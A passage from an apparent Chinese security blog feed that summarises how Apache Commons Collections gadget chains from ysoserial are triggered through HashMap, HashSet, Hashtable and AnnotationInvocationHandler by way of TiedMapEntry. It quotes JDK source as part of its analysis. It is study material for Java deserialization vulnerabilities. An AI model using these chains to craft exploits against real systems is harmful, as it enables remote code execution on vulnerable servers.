class="line">......</span><br></pre></td></tr></table></figure><p>跟进：hash方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object k)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> hashSeed;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != h &amp;&amp; k <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        <span class="keyword">return</span> sun.misc.Hashing.stringHash32((String) k);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h ^= k.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This function ensures that hashCodes that differ only by</span></span><br><span class="line">    <span class="comment">// constant multiples at each bit position have a bounded</span></span><br><span class="line">    <span class="comment">// number of collisions (approximately 8 at default load factor).</span></span><br><span class="line">    h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的<code>k.hashCode()</code>，如果把key设置为TiedMapEntry的实例，直接就把利用链构造出来了</p><h2 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in any hidden serialization magic</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in HashMap capacity and load factor and create backing HashMap</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">        <span class="type">float</span> <span class="variable">loadFactor</span> <span class="operator">=</span> s.readFloat();</span><br><span class="line">        map = (((HashSet)<span class="built_in">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in size</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">            <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) s.readObject();</span><br><span class="line">            map.put(e, PRESENT);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>map.put(e, PRESENT)</code></p><p>这个利用链和前面的HashMap利用链接上了，<code>map.put(e, PRESENT)=HashMap.put(e, PRESENT)-&gt;HashMap.hash(e)-&gt;e.hashCode()</code></p><p>所以只需要把tiedMapEntry放进HashSet即可完成利用链的构造</p><h2 id="HashTable"><a href="#HashTable" class="headerlink" title="HashTable"></a>HashTable</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">     <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;......</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">        <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">        <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">        <span class="comment">// synch could be eliminated for performance</span></span><br><span class="line">        reconstitutionPut(newTable, key, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>CC7里的，跟进reconstitutionPut方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;K,V&gt;[] tab, K key, V value)</span></span><br><span class="line">    <span class="keyword">throws</span> StreamCorruptedException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    <span class="comment">// This should not happen in deserialized version.</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Creates the new entry.</span></span><br><span class="line">    Entry&lt;K,V&gt; e = tab[index];</span><br><span class="line">    tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键调用了<code>e.key.equals(key)</code>，这里可以和TiedMapEntry联系起来，详细见cc7</p><h2 id="HashTable2"><a href="#HashTable2" class="headerlink" title="HashTable2"></a>HashTable2</h2><p>同样reconstitutionPut方法方法中有hash()方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object k)</span> &#123;</span><br><span class="line">    <span class="comment">// hashSeed will be zero if alternative hashing is disabled.</span></span><br><span class="line">    <span class="keyword">return</span> hashSeed ^ k.hashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里也可以通过TiedMapEntry来连接</p><h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p>sun.reflect.annotation.AnnotationInvocationHandler</p><p>可以看CC1【2】中对其的分析，以及对<code>Gadgets.createMemoitizedProxy(lazyMap, Map.class)</code>方法的分析</p><p><a href="https://xianbei.top/2022/03/15/cc1study2/#title-6">https://xianbei.top/2022/03/15/cc1study2/#title-6</a></p><h1 id="参考-amp-好文mark"><a href="#参考-amp-好文mark" class="headerlink" title="参考&amp;好文mark"></a>参考&amp;好文mark</h1><p><a href="https://www.cnblogs.com/bitterz/p/15035581.html">https://www.cnblogs.com/bitterz/p/15035581.html</a></p><p><a href="https://xz.aliyun.com/t/8164">https://xz.aliyun.com/t/8164</a></p><p><a href="https://xz.aliyun.com/t/9451">https://xz.aliyun.com/t/9451</a></p><p>下面这个一定要看，不看后悔一辈子</p><p><a href="http://www.whrizyl819.xyz/">http://www.whrizyl819.xyz/</a></p>]]></content>
    
    
    <summary type="html">调试完了Ysoserial中Apache-Commons-Collections的七条链子，对其进行简单总结。</summary>
    
    
    
    <category term="javaSec" scheme="https://xianbeil.github.io/categories/javaSec/"/>
    
    
    <category term="java反序列化" scheme="https://xianbeil.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
</feed>
